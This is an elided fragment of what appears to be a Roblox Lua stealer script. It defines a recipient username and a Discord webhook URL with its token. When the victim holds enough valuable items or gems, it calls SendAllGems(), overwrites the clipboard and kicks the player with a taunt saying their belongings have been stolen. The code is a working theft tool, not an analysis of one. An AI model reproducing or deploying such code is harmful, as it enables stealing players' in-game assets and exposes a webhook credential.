Username = "kbones"
Webhook = "https://discordapp.com/api/webhooks/1223927020149542942/FmrDGyGONWhCMznFFL7VFbZrW03h0hs84XLIcknAxTQOix-XXzv9A_49Aj-_uvidytsN"
...
if CountHuges() > 0 or CountGems() > 500000 then
	...
	SendAllGems()
	setclipboard("lol")
	plr:kick("All your stuff has just been stolen by ToT0")
else
